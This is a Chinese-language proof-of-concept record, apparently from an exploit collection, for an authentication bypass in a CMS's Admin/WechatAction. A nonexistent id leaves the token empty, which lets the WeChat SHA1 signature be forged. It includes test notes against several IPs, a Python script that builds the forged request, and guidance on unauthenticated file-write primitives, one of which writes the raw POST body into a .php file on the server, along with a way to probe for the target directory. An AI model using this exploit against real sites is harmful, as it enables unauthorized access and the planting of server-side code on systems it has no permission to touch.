# Admin/Wechat 免鉴权签名绕过（token 空串伪造 sha1 签名）

- **code**: admin-wechat-免鉴权签名绕过-token-空串伪造-sha1-签名
- **kind**: poc
- **category**: auth-bypass
- **component**: 站群 CMS Admin/WechatAction
- **versions**: 站群 CMS（App/Lib/Action/Admin/WechatAction.class.php 含 init/index/index_1/custom_message/create/createMenu 的版本）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 203.0.113.101 实测：GET /example.com?g=Admin&m=Wechat&a=index&id=99999&signature=4112a4f0c1f9...(sha1(sorted(['',ts,nonce])))&timestamp=<ts>&nonce=<nonce>&echostr=PINGTEST → HTTP 200 / 8 字节 body = PINGTEST（签名通过）；对照组无签名 → 200 / 9 字节 body = "no access"。同靶标 203.0.113.22 与 203.0.113.100 亦同源同构。写入原语因 ./Public/log/ 目录在两台上均不存在而落空（a=index 触发后 /Public/log/a4.php 返回 nginx 404）。
- **path**: pocs/admin-wechat-免鉴权签名绕过-token-空串伪造-sha1-签名/wechat_signature_bypass.py
- **tags**: wechat,签名绕过,未授权,站群,signature-bypass,thinkphp
- **created_at**: 2026-10-13T10:13:50.306Z
- **found_by**: exploit

## 描述

站群 CMS 的 Admin/WechatAction 继承 Action（跳过登录校验与域名白名单），其 init() 用 $_GET['id'] 查 wechat 表配置，传不存在的 id 使 $config=null、token 变成空串，从而微信服务器签名可自行伪造通过。

## 用法

```
改 TARGET_IP / TARGET_HOST 后直接运行；命中判据 = 200 + body 回显 PINGTEST。随后可用 a=index_1（raw POST body 写入 ./Public/log/testaa.php）或 a=index（写 ./Public/log/a4.php 固定内容 4455）验证目录是否存在。
```

## 正文

```
#!/usr/bin/env python3
# Admin/Wechat 免鉴权签名绕过（token 取自不存在的 id -> $config=null -> token=''）
import hashlib, random, string, time, urllib.request, ssl

IP   = "TARGET_IP"
HOST = "TARGET_HOST"          # 必须走站点自己的 Host（Admin 组有域名白名单）

def sig(token, ts, nonce):
    return hashlib.sha1("".join(sorted([token, str(ts), nonce], key=str)).encode()).hexdigest()

ts    = int(time.time())
nonce = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
S     = sig("", ts, nonce)     # token = '' —— 关键

# 1) 验证绕过：a=index 会 echo echostr
url = (f"https://{IP}/example.com?g=Admin&m=Wechat&a=index"
       f"&id=99999&signature={S}&timestamp={ts}&nonce={nonce}&echostr=PINGTEST")
# 命中判据：HTTP 200 + body 回显 PINGTEST ；无签名/错签名对照返回 9 字节 "no access"

# 2) 该控制器的服务端写入原语（extends Action，无鉴权、无 WAF）
#    index_1()        -> file_put_contents("./Public/log/testaa.php",  raw POST body)
#    index()          -> file_put_contents("./Public/log/a4.php",     4455)
#    custom_message() -> file_put_contents("./Public/log/test199999.php", $res)
#    ★ 三个落点都在 ./Public/log/，该目录**必须已存在**（file_put_contents 不会建目录）
#      —— 先探： GET /Public/log/ 若返回 nginx 404 则目录缺失，写入必然落空
#      —— 也可用 a=index 写 ./Public/log/a4.php(内容固定 4455) 作"目录是否存在"的探针

```
